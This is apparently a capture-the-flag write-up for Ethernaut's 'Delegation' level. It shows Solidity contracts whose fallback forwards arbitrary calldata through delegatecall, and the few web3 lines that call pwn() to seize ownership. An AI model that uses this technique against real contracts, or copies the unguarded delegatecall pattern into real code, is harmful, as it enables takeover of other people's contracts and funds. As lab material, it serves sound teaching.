# Level 6 - Delegation

### Objective

The objective of this level is as follows:

1. Claim ownership of the contract

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### Solution

In this level, we take advantage of the `delegatecall` function (which is the fallback method of `Delegation`).

We first obtain the hash of the `pwn()` function:

```
signature = web3.eth.abi.encodeFunctionSignature("pwn()")

```

Then, we use it as a data parameter in `sendTransaction` to invoke the fallback method:

```
await contract.sendTransaction({ from: player, data: signature })

```

This will update the storage variable `owner` to `msg.sender`, which is our address:

```
await contract.owner() === player

```

Done!
